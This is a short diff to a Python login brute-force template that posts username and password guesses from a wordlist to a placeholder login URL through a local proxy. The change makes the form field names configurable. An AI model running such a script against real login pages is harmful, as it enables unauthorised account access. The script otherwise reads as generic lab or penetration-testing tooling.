@@ -1,6 +1,6 @@
 import requests
 
-ip = "login form url"
+url = "login form url"
 wordlist = "{path to wordlist}"
 
 login_fail_message = "message that appears when login fails"
@@ -10,12 +10,16 @@ proxy = {'http' : '127.0.0.1:8080' }
 
 
 def login(username, password):
+
+    username_field_name = "username field name attribute value"
+    password_field_name = "password field name attribute value"
+
     creds = {
-            'username' : username,
-            'pass' : password,
+            username_field_name : username,
+            password_field_name : password,
             }
     
-    r = requests.post(ip, data=creds, proxies=proxy)
+    r = requests.post(url, data=creds, proxies=proxy)
 
     if login_fail_message in r.text:
         pass
